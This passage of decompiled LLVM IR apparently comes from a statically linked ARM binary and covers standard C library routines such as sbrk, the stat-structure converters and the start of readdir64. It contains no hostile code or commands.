  br i1 %v2_154ac, label %dec_label_pc_154c0, label %entry.dec_label_pc_154c8_crit_edge

entry.dec_label_pc_154c8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_154c8

dec_label_pc_154c0:                               ; preds = %entry
  store i32 %v3_154b0, i32* @r4, align 4
  store i32 %v9_154b0, i32* @r6, align 4
  %v0_154c4 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_154c8

dec_label_pc_154c8:                               ; preds = %entry.dec_label_pc_154c8_crit_edge, %dec_label_pc_154c0
  %v0_154c8 = call i32 @__libc_enable_asynccancel()
  %v0_154cc = load i32, i32* @r6, align 4
  store i32 %v0_154cc, i32* @r1, align 4
  store i32 %v0_154c8, i32* @r5, align 4
  %v0_154d4 = load i32, i32* @r4, align 4
  store i32 %v0_154d4, i32* @r0, align 4
  %v0_154d8 = call i32 @__syscall_nanosleep()
  store i32 %v0_154d8, i32* @r4, align 4
  %v0_154e0 = load i32, i32* @r5, align 4
  %v1_154e4 = call i32 @__libc_disable_asynccancel(i32 %v0_154e0)
  %v0_154e8 = load i32, i32* @r4, align 4
  ret i32 %v0_154e8

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 2, 7, 12, 1, 6, 5, 4, 8, 11, 3, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 2, 7, 12, 1, 6, 5, 4, 8, 11, 3, 10, 9, 0 }
  uselistorder label %dec_label_pc_154c8, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_154fc = load i32, i32* @r4, align 4
  store i32 %v3_154fc, i32* %stack_var_-16, align 4
  store i32 11576, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r4.global-to-local, align 4
  %v4_1550c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 11576) to i32*), align 4
  %v2_15510 = icmp eq i32 %v4_1550c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_15510, label %dec_label_pc_1551c, label %dec_label_pc_1552c

dec_label_pc_1551c:                               ; preds = %entry
  %v1_15520 = call i32 @__GI_brk(i32 0)
  %v1_15524 = icmp slt i32 %v1_15520, 0
  br i1 %v1_15524, label %dec_label_pc_15550, label %dec_label_pc_1552cthread-pre-split

dec_label_pc_1552cthread-pre-split:               ; preds = %dec_label_pc_1551c
  %v0_15530.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_1552c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1552c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_1552cthread-pre-split, %entry
  %v1_1552c = phi i32 [ %v1_1552c.pre, %dec_label_pc_1552cthread-pre-split ], [ 11576, %entry ]
  %v0_1552c = phi i32 [ %v0_1552c.pre, %dec_label_pc_1552cthread-pre-split ], [ ptrtoint (i32* @global_var_22010.349 to i32), %entry ]
  %v1_15540 = phi i32 [ %v0_15530.pr, %dec_label_pc_1552cthread-pre-split ], [ %arg1, %entry ]
  %v2_1552c = add i32 %v0_1552c, %v1_1552c
  %v3_1552c = inttoptr i32 %v2_1552c to i32*
  %v4_1552c = load i32, i32* %v3_1552c, align 4
  %v2_15530 = icmp eq i32 %v1_15540, 0
  store i32 %v4_1552c, i32* %r4.global-to-local, align 4
  br i1 %v2_15530, label %dec_label_pc_15554, label %dec_label_pc_1553c

dec_label_pc_1553c:                               ; preds = %dec_label_pc_1552c
  %v2_15540 = add i32 %v4_1552c, %v1_15540
  %v1_15544 = call i32 @__GI_brk(i32 %v2_15540)
  %v1_15548 = icmp slt i32 %v1_15544, 0
  br i1 %v1_15548, label %dec_label_pc_15550, label %dec_label_pc_1553c.dec_label_pc_15554_crit_edge

dec_label_pc_1553c.dec_label_pc_15554_crit_edge:  ; preds = %dec_label_pc_1553c
  %v0_15554.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15554

dec_label_pc_15550:                               ; preds = %dec_label_pc_1553c, %dec_label_pc_1551c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15554

dec_label_pc_15554:                               ; preds = %dec_label_pc_1552c, %dec_label_pc_1553c.dec_label_pc_15554_crit_edge, %dec_label_pc_15550
  %v0_15554 = phi i32 [ %v0_15554.pre, %dec_label_pc_1553c.dec_label_pc_15554_crit_edge ], [ -1, %dec_label_pc_15550 ], [ %v4_1552c, %dec_label_pc_1552c ]
  %v2_15558 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15558, i32* @r4, align 4
  ret i32 %v0_15554

; uselistorder directives
  uselistorder i32 %v4_1552c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_15554, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15578 = load i32, i32* @r0, align 4
  ret i32 %v1_15578
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1557c = load i32, i32* @r4, align 4
  store i32 %v3_1557c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_15594 = inttoptr i32 %arg2 to i8*
  %v4_15594 = call i32 @__GI_memset(i8* %v3_15594, i32 0, i32 104)
  %v2_15598 = load i32, i32* %arg1, align 4
  store i32 %v2_15598, i32* %r3.global-to-local, align 4
  %v3_15598 = add i32 %tmp, 4
  %v4_15598 = inttoptr i32 %v3_15598 to i32*
  %v5_15598 = load i32, i32* %v4_15598, align 4
  store i32 %v5_15598, i32* %r4.global-to-local, align 4
  %v0_1559c = load i32, i32* %r5.global-to-local, align 4
  %v1_1559c = inttoptr i32 %v0_1559c to i32*
  store i32 %v2_15598, i32* %v1_1559c, align 4
  %v3_1559c = add i32 %v0_1559c, 4
  %v4_1559c = inttoptr i32 %v3_1559c to i32*
  %v5_1559c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1559c, i32* %v4_1559c, align 4
  %v0_155a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_155a0 = add i32 %v0_155a0, 12
  %v2_155a0 = inttoptr i32 %v1_155a0 to i32*
  %v3_155a0 = load i32, i32* %v2_155a0, align 4
  %v1_155a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_155a4 = add i32 %v1_155a4, 12
  %v3_155a4 = inttoptr i32 %v2_155a4 to i32*
  store i32 %v3_155a0, i32* %v3_155a4, align 4
  %v0_155a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_155a8 = add i32 %v0_155a8, 96
  store i32 %v1_155a8, i32* %r3.global-to-local, align 4
  %v1_155ac = inttoptr i32 %v1_155a8 to i32*
  %v2_155ac = load i32, i32* %v1_155ac, align 4
  store i32 %v2_155ac, i32* %r3.global-to-local, align 4
  %v3_155ac = add i32 %v0_155a8, 100
  %v4_155ac = inttoptr i32 %v3_155ac to i32*
  %v5_155ac = load i32, i32* %v4_155ac, align 4
  store i32 %v5_155ac, i32* %r4.global-to-local, align 4
  %v1_155b0 = add i32 %v0_155a8, 56
  %v2_155b0 = inttoptr i32 %v1_155b0 to i32*
  %v3_155b0 = load i32, i32* %v2_155b0, align 4
  store i32 %v3_155b0, i32* %r2.global-to-local, align 4
  %v1_155b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_155b4 = add i32 %v1_155b4, 96
  %v3_155b4 = inttoptr i32 %v2_155b4 to i32*
  store i32 %v2_155ac, i32* %v3_155b4, align 4
  %v0_155b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_155b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_155b8 = add i32 %v1_155b8, 100
  %v3_155b8 = inttoptr i32 %v2_155b8 to i32*
  store i32 %v0_155b8, i32* %v3_155b8, align 4
  %v0_155bc = load i32, i32* %r6.global-to-local, align 4
  %v1_155bc = add i32 %v0_155bc, 24
  store i32 %v1_155bc, i32* %ip.global-to-local, align 4
  %v1_155c0 = inttoptr i32 %v1_155bc to i32*
  %v2_155c0 = load i32, i32* %v1_155c0, align 4
  store i32 %v2_155c0, i32* %ip.global-to-local, align 4
  %v3_155c0 = add i32 %v0_155bc, 28
  %v4_155c0 = inttoptr i32 %v3_155c0 to i32*
  %v5_155c0 = load i32, i32* %v4_155c0, align 4
  store i32 %v5_155c0, i32* %lr.global-to-local, align 4
  %v0_155c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_155c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_155c4 = add i32 %v1_155c4, 56
  %v3_155c4 = inttoptr i32 %v2_155c4 to i32*
  store i32 %v0_155c4, i32* %v3_155c4, align 4
  %v0_155c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_155c8 = add i32 %v0_155c8, 72
  store i32 %v1_155c8, i32* %r3.global-to-local, align 4
  %v1_155cc = add i32 %v0_155c8, 32
  store i32 %v1_155cc, i32* %r7.global-to-local, align 4
  %v1_155d0 = inttoptr i32 %v1_155cc to i32*
  %v2_155d0 = load i32, i32* %v1_155d0, align 4
  store i32 %v2_155d0, i32* %r7.global-to-local, align 4
  %v3_155d0 = add i32 %v0_155c8, 36
  %v4_155d0 = inttoptr i32 %v3_155d0 to i32*
  %v5_155d0 = load i32, i32* %v4_155d0, align 4
  store i32 %v5_155d0, i32* %r8.global-to-local, align 4
  %v1_155d4 = inttoptr i32 %v1_155c8 to i32*
  %v2_155d4 = load i32, i32* %v1_155d4, align 4
  %v3_155d4 = add i32 %v0_155c8, 76
  %v4_155d4 = inttoptr i32 %v3_155d4 to i32*
  %v5_155d4 = load i32, i32* %v4_155d4, align 4
  store i32 %v5_155d4, i32* %r1.global-to-local, align 4
  %v0_155d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_155d8 = add i32 %v0_155d8, 72
  %v1_155dc = inttoptr i32 %v1_155d8 to i32*
  store i32 %v2_155d4, i32* %v1_155dc, align 4
  %v3_155dc = add i32 %v0_155d8, 76
  %v4_155dc = inttoptr i32 %v3_155dc to i32*
  %v5_155dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_155dc, i32* %v4_155dc, align 4
  %v0_155e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_155e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_155e0 = add i32 %v1_155e0, 32
  %v3_155e0 = inttoptr i32 %v2_155e0 to i32*
  store i32 %v0_155e0, i32* %v3_155e0, align 4
  %v0_155e4 = load i32, i32* %r8.global-to-local, align 4
  %v1_155e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_155e4 = add i32 %v1_155e4, 36
  %v3_155e4 = inttoptr i32 %v2_155e4 to i32*
  store i32 %v0_155e4, i32* %v3_155e4, align 4
  %v0_155e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_155e8 = add i32 %v0_155e8, 80
  store i32 %v1_155e8, i32* %r3.global-to-local, align 4
  %v1_155ec = add i32 %v0_155e8, 48
  store i32 %v1_155ec, i32* %r7.global-to-local, align 4
  %v1_155f0 = inttoptr i32 %v1_155ec to i32*
  %v2_155f0 = load i32, i32* %v1_155f0, align 4
  store i32 %v2_155f0, i32* %r7.global-to-local, align 4
  %v3_155f0 = add i32 %v0_155e8, 52
  %v4_155f0 = inttoptr i32 %v3_155f0 to i32*
  %v5_155f0 = load i32, i32* %v4_155f0, align 4
  store i32 %v5_155f0, i32* %r8.global-to-local, align 4
  %v1_155f4 = inttoptr i32 %v1_155e8 to i32*
  %v2_155f4 = load i32, i32* %v1_155f4, align 4
  %v3_155f4 = add i32 %v0_155e8, 84
  %v4_155f4 = inttoptr i32 %v3_155f4 to i32*
  %v5_155f4 = load i32, i32* %v4_155f4, align 4
  store i32 %v5_155f4, i32* %r1.global-to-local, align 4
  %v1_155f8 = add i32 %v0_155e8, 16
  %v2_155f8 = inttoptr i32 %v1_155f8 to i32*
  %v3_155f8 = load i32, i32* %v2_155f8, align 4
  store i32 %v3_155f8, i32* %r2.global-to-local, align 4
  %v0_155fc = load i32, i32* %r5.global-to-local, align 4
  %v1_155fc = add i32 %v0_155fc, 80
  %v1_15600 = inttoptr i32 %v1_155fc to i32*
  store i32 %v2_155f4, i32* %v1_15600, align 4
  %v3_15600 = add i32 %v0_155fc, 84
  %v4_15600 = inttoptr i32 %v3_15600 to i32*
  %v5_15600 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15600, i32* %v4_15600, align 4
  %v0_15604 = load i32, i32* %r7.global-to-local, align 4
  %v1_15604 = load i32, i32* %r5.global-to-local, align 4
  %v2_15604 = add i32 %v1_15604, 48
  %v3_15604 = inttoptr i32 %v2_15604 to i32*
  store i32 %v0_15604, i32* %v3_15604, align 4
  %v0_15608 = load i32, i32* %r8.global-to-local, align 4
  %v1_15608 = load i32, i32* %r5.global-to-local, align 4
  %v2_15608 = add i32 %v1_15608, 52
  %v3_15608 = inttoptr i32 %v2_15608 to i32*
  store i32 %v0_15608, i32* %v3_15608, align 4
  %v0_1560c = load i32, i32* %r2.global-to-local, align 4
  %v1_1560c = load i32, i32* %r5.global-to-local, align 4
  %v2_1560c = add i32 %v1_1560c, 16
  %v3_1560c = inttoptr i32 %v2_1560c to i32*
  store i32 %v0_1560c, i32* %v3_1560c, align 4
  %v0_15610 = load i32, i32* %r6.global-to-local, align 4
  %v1_15610 = add i32 %v0_15610, 88
  store i32 %v1_15610, i32* %r3.global-to-local, align 4
  %v1_15614 = add i32 %v0_15610, 20
  %v2_15614 = inttoptr i32 %v1_15614 to i32*
  %v3_15614 = load i32, i32* %v2_15614, align 4
  store i32 %v3_15614, i32* %r2.global-to-local, align 4
  %v1_15618 = inttoptr i32 %v1_15610 to i32*
  %v2_15618 = load i32, i32* %v1_15618, align 4
  %v3_15618 = add i32 %v0_15610, 92
  %v4_15618 = inttoptr i32 %v3_15618 to i32*
  %v5_15618 = load i32, i32* %v4_15618, align 4
  store i32 %v5_15618, i32* %r1.global-to-local, align 4
  %v1_1561c = add i32 %v0_15610, 64
  store i32 %v1_1561c, i32* %r6.global-to-local, align 4
  %v1_15620 = inttoptr i32 %v1_1561c to i32*
  %v2_15620 = load i32, i32* %v1_15620, align 4
  store i32 %v2_15620, i32* %r6.global-to-local, align 4
  %v3_15620 = add i32 %v0_15610, 68
  %v4_15620 = inttoptr i32 %v3_15620 to i32*
  %v5_15620 = load i32, i32* %v4_15620, align 4
  store i32 %v5_15620, i32* %r7.global-to-local, align 4
  %v0_15624 = load i32, i32* %r5.global-to-local, align 4
  %v1_15624 = add i32 %v0_15624, 88
  store i32 %v1_15624, i32* %r3.global-to-local, align 4
  %v2_15628 = add i32 %v0_15624, 20
  %v3_15628 = inttoptr i32 %v2_15628 to i32*
  store i32 %v3_15614, i32* %v3_15628, align 4
  %v0_1562c = load i32, i32* %ip.global-to-local, align 4
  %v1_1562c = load i32, i32* %r5.global-to-local, align 4
  %v2_1562c = add i32 %v1_1562c, 24
  %v3_1562c = inttoptr i32 %v2_1562c to i32*
  store i32 %v0_1562c, i32* %v3_1562c, align 4
  %v0_15630 = load i32, i32* %lr.global-to-local, align 4
  %v1_15630 = load i32, i32* %r5.global-to-local, align 4
  %v2_15630 = add i32 %v1_15630, 28
  %v3_15630 = inttoptr i32 %v2_15630 to i32*
  store i32 %v0_15630, i32* %v3_15630, align 4
  %v0_15634 = load i32, i32* %r6.global-to-local, align 4
  %v1_15634 = load i32, i32* %r5.global-to-local, align 4
  %v2_15634 = add i32 %v1_15634, 64
  %v3_15634 = inttoptr i32 %v2_15634 to i32*
  store i32 %v0_15634, i32* %v3_15634, align 4
  %v0_15638 = load i32, i32* %r7.global-to-local, align 4
  %v1_15638 = load i32, i32* %r5.global-to-local, align 4
  %v2_15638 = add i32 %v1_15638, 68
  %v3_15638 = inttoptr i32 %v2_15638 to i32*
  store i32 %v0_15638, i32* %v3_15638, align 4
  %v0_1563c = load i32, i32* %r3.global-to-local, align 4
  %v1_1563c = inttoptr i32 %v0_1563c to i32*
  store i32 %v2_15618, i32* %v1_1563c, align 4
  %v3_1563c = add i32 %v0_1563c, 4
  %v4_1563c = inttoptr i32 %v3_1563c to i32*
  %v5_1563c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1563c, i32* %v4_1563c, align 4
  %v2_15640 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15640, i32* %r4.global-to-local, align 4
  ret i32 %v2_15618

; uselistorder directives
  uselistorder i32 %v0_15610, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_155e8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15648 = load i32, i32* @r4, align 4
  store i32 %v3_15648, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_15660 = inttoptr i32 %arg2 to i8*
  %v4_15660 = call i32 @__GI_memset(i8* %v3_15660, i32 0, i32 88)
  %v2_15664 = load i32, i32* %arg1, align 4
  %v3_15664 = add i32 %tmp, 4
  %v4_15664 = inttoptr i32 %v3_15664 to i32*
  %v5_15664 = load i32, i32* %v4_15664, align 4
  store i32 %v5_15664, i32* %r4.global-to-local, align 4
  %v0_15668 = load i32, i32* %r6.global-to-local, align 4
  %v1_15668 = inttoptr i32 %v0_15668 to i32*
  store i32 %v2_15664, i32* %v1_15668, align 4
  %v3_15668 = add i32 %v0_15668, 4
  %v4_15668 = inttoptr i32 %v3_15668 to i32*
  %v5_15668 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15668, i32* %v4_15668, align 4
  %v0_1566c = load i32, i32* %r5.global-to-local, align 4
  %v1_1566c = add i32 %v0_1566c, 32
  %v1_15670 = inttoptr i32 %v1_1566c to i32*
  %v2_15670 = load i32, i32* %v1_15670, align 4
  %v3_15670 = add i32 %v0_1566c, 36
  %v4_15670 = inttoptr i32 %v3_15670 to i32*
  %v5_15670 = load i32, i32* %v4_15670, align 4
  store i32 %v5_15670, i32* %r4.global-to-local, align 4
  %v1_15674 = add i32 %v0_1566c, 96
  %v2_15674 = inttoptr i32 %v1_15674 to i32*
  %v3_15674 = load i32, i32* %v2_15674, align 4
  store i32 %v3_15674, i32* %r2.global-to-local, align 4
  %v1_15678 = load i32, i32* %r6.global-to-local, align 4
  %v2_15678 = add i32 %v1_15678, 32
  %v3_15678 = inttoptr i32 %v2_15678 to i32*
  store i32 %v2_15670, i32* %v3_15678, align 4
  %v0_1567c = load i32, i32* %r4.global-to-local, align 4
  %v1_1567c = load i32, i32* %r6.global-to-local, align 4
  %v2_1567c = add i32 %v1_1567c, 36
  %v3_1567c = inttoptr i32 %v2_1567c to i32*
  store i32 %v0_1567c, i32* %v3_1567c, align 4
  %v0_15680 = load i32, i32* %r2.global-to-local, align 4
  %v1_15680 = load i32, i32* %r6.global-to-local, align 4
  %v2_15680 = add i32 %v1_15680, 12
  %v3_15680 = inttoptr i32 %v2_15680 to i32*
  store i32 %v0_15680, i32* %v3_15680, align 4
  %v0_15684 = load i32, i32* %r5.global-to-local, align 4
  %v1_15684 = add i32 %v0_15684, 48
  %v2_15684 = inttoptr i32 %v1_15684 to i32*
  %v3_15684 = load i32, i32* %v2_15684, align 4
  %v1_15688 = add i32 %v0_15684, 24
  store i32 %v1_15688, i32* %ip.global-to-local, align 4
  %v1_1568c = inttoptr i32 %v1_15688 to i32*
  %v2_1568c = load i32, i32* %v1_1568c, align 4
  store i32 %v2_1568c, i32* %ip.global-to-local, align 4
  %v3_1568c = add i32 %v0_15684, 28
  %v4_1568c = inttoptr i32 %v3_1568c to i32*
  %v5_1568c = load i32, i32* %v4_1568c, align 4
  store i32 %v5_1568c, i32* %lr.global-to-local, align 4
  %v1_15690 = load i32, i32* %r6.global-to-local, align 4
  %v2_15690 = add i32 %v1_15690, 44
  %v3_15690 = inttoptr i32 %v2_15690 to i32*
  store i32 %v3_15684, i32* %v3_15690, align 4
  %v0_15694 = load i32, i32* %r5.global-to-local, align 4
  %v1_15694 = add i32 %v0_15694, 64
  %v2_15694 = inttoptr i32 %v1_15694 to i32*
  %v3_15694 = load i32, i32* %v2_15694, align 4
  %v1_15698 = add i32 %v0_15694, 56
  %v2_15698 = inttoptr i32 %v1_15698 to i32*
  %v3_15698 = load i32, i32* %v2_15698, align 4
  store i32 %v3_15698, i32* %r2.global-to-local, align 4
  %v1_1569c = load i32, i32* %r6.global-to-local, align 4
  %v2_1569c = add i32 %v1_1569c, 52
  %v3_1569c = inttoptr i32 %v2_1569c to i32*
  store i32 %v3_15694, i32* %v3_1569c, align 4
  %v0_156a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_156a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_156a0 = add i32 %v1_156a0, 48
  %v3_156a0 = inttoptr i32 %v2_156a0 to i32*
  store i32 %v0_156a0, i32* %v3_156a0, align 4
  %v0_156a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_156a4 = add i32 %v0_156a4, 72
  %v1_156a8 = inttoptr i32 %v1_156a4 to i32*
  %v2_156a8 = load i32, i32* %v1_156a8, align 4
  %v3_156a8 = add i32 %v0_156a4, 76
  %v4_156a8 = inttoptr i32 %v3_156a8 to i32*
  %v5_156a8 = load i32, i32* %v4_156a8, align 4
  store i32 %v5_156a8, i32* %r1.global-to-local, align 4
  %v0_156ac = load i32, i32* %r6.global-to-local, align 4
  %v1_156ac = add i32 %v0_156ac, 56
  %v1_156b0 = inttoptr i32 %v1_156ac to i32*
  store i32 %v2_156a8, i32* %v1_156b0, align 4
  %v3_156b0 = add i32 %v0_156ac, 60
  %v4_156b0 = inttoptr i32 %v3_156b0 to i32*
  %v5_156b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_156b0, i32* %v4_156b0, align 4
  %v0_156b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_156b4 = add i32 %v0_156b4, 80
  %v1_156b8 = inttoptr i32 %v1_156b4 to i32*
  %v2_156b8 = load i32, i32* %v1_156b8, align 4
  %v3_156b8 = add i32 %v0_156b4, 84
  %v4_156b8 = inttoptr i32 %v3_156b8 to i32*
  %v5_156b8 = load i32, i32* %v4_156b8, align 4
  store i32 %v5_156b8, i32* %r1.global-to-local, align 4
  %v0_156bc = load i32, i32* %r6.global-to-local, align 4
  %v1_156bc = add i32 %v0_156bc, 64
  %v1_156c0 = inttoptr i32 %v1_156bc to i32*
  store i32 %v2_156b8, i32* %v1_156c0, align 4
  %v3_156c0 = add i32 %v0_156bc, 68
  %v4_156c0 = inttoptr i32 %v3_156c0 to i32*
  %v5_156c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_156c0, i32* %v4_156c0, align 4
  %v0_156c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_156c4 = add i32 %v0_156c4, 16
  %v2_156c4 = inttoptr i32 %v1_156c4 to i32*
  %v3_156c4 = load i32, i32* %v2_156c4, align 4
  %v1_156c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_156c8 = add i32 %v1_156c8, 16
  %v3_156c8 = inttoptr i32 %v2_156c8 to i32*
  store i32 %v3_156c4, i32* %v3_156c8, align 4
  %v0_156cc = load i32, i32* %r5.global-to-local, align 4
  %v1_156cc = add i32 %v0_156cc, 88
  %v1_156d0 = add i32 %v0_156cc, 20
  %v2_156d0 = inttoptr i32 %v1_156d0 to i32*
  %v3_156d0 = load i32, i32* %v2_156d0, align 4
  store i32 %v3_156d0, i32* %r2.global-to-local, align 4
  %v1_156d4 = inttoptr i32 %v1_156cc to i32*
  %v2_156d4 = load i32, i32* %v1_156d4, align 4
  %v3_156d4 = add i32 %v0_156cc, 92
  %v4_156d4 = inttoptr i32 %v3_156d4 to i32*
  %v5_156d4 = load i32, i32* %v4_156d4, align 4
  store i32 %v5_156d4, i32* %r1.global-to-local, align 4
  %v0_156d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_156d8 = add i32 %v0_156d8, 72
  %v1_156dc = inttoptr i32 %v1_156d8 to i32*
  store i32 %v2_156d4, i32* %v1_156dc, align 4
  %v3_156dc = add i32 %v0_156d8, 76
  %v4_156dc = inttoptr i32 %v3_156dc to i32*
  %v5_156dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_156dc, i32* %v4_156dc, align 4
  %v0_156e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_156e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_156e0 = add i32 %v1_156e0, 20
  %v3_156e0 = inttoptr i32 %v2_156e0 to i32*
  store i32 %v0_156e0, i32* %v3_156e0, align 4
  %v0_156e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_156e4 = load i32, i32* %r6.global-to-local, align 4
  %v2_156e4 = add i32 %v1_156e4, 24
  %v3_156e4 = inttoptr i32 %v2_156e4 to i32*
  store i32 %v0_156e4, i32* %v3_156e4, align 4
  %v0_156e8 = load i32, i32* %lr.global-to-local, align 4
  %v1_156e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_156e8 = add i32 %v1_156e8, 28
  %v3_156e8 = inttoptr i32 %v2_156e8 to i32*
  store i32 %v0_156e8, i32* %v3_156e8, align 4
  %v2_156ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_156ec, i32* %r4.global-to-local, align 4
  ret i32 %v2_156d4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r6, align 4
  %v1_15708 = add i32 %tmp, 24
  store i32 %v1_15708, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_15720 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 112) to i32*), align 4
  store i32 %v4_15720, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15720)
  %v0_15734 = load i32, i32* @r6, align 4
  %v2_15734 = add i32 %v0_15734, 16
  %v3_15734 = inttoptr i32 %v2_15734 to i32*
  %v4_15734 = load i32, i32* %v3_15734, align 4
  store i32 %v4_15734, i32* %ip.global-to-local, align 4
  store i32 87872, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15734)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15744

dec_label_pc_15744:                               ; preds = %dec_label_pc_15774, %entry
  %v0_15744 = load i32, i32* @r5, align 4
  %v1_15744 = add i32 %v0_15744, 4
  %v2_15744 = inttoptr i32 %v1_15744 to i32*
  %v3_15744 = load i32, i32* %v2_15744, align 4
  %v4_15744 = add i32 %v0_15744, 8
  %v5_15744 = inttoptr i32 %v4_15744 to i32*
  %v6_15744 = load i32, i32* %v5_15744, align 4
  %tmp10 = icmp ugt i32 %v6_15744, %v3_15744
  br i1 %tmp10, label %dec_label_pc_15774, label %dec_label_pc_15750

dec_label_pc_15750:                               ; preds = %dec_label_pc_15744
  %v1_15750 = inttoptr i32 %v0_15744 to i32*
  %v2_15750 = load i32, i32* %v1_15750, align 4
  %v1_15754 = add i32 %v0_15744, 12
  %v2_15754 = inttoptr i32 %v1_15754 to i32*
  %v3_15754 = load i32, i32* %v2_15754, align 4
  %v1_15758 = add i32 %v0_15744, 20
  %v2_15758 = inttoptr i32 %v1_15758 to i32*
  %v3_15758 = load i32, i32* %v2_15758, align 4
  %v4_1575c = inttoptr i32 %v3_15754 to i32*
  %v5_1575c = call i32 @__getdents64(i32 %v2_15750, i32* %v4_1575c, i32 %v3_15758, i32 %v6_15744)
  %tmp9 = icmp slt i32 %v5_1575c, 1
